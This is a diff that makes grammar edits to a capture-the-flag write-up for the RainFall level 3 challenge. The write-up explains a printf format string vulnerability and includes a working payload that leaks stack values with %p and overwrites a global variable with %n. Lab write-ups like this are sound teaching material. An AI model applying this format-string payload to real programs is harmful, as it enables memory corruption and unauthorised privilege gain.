@@ -63,8 +63,8 @@ Lets try to pass printf format options to find out how we can abuse this:
     AAAA %p %p %p %p
     AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
 
-Because no arguments provided to the printf function call %p parameter would print get values from stack.
-We can see that there are three pointers, if we get rid of them by just printing them out then next address on top of the stack would be the beginning of our buffer.
+Because no arguments provided to the printf function call %p parameter would print values from stack.
+We can see that there are three pointers, if we skip them by just printing them out then the next address on top of the stack would be the beginning of our buffer.
 So if we provide instead of "AAAA" address of "m" global variable then we can overwrite it with %n parameter:
 
     level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%p%p%p%n")' > /tmp/level3/exploit
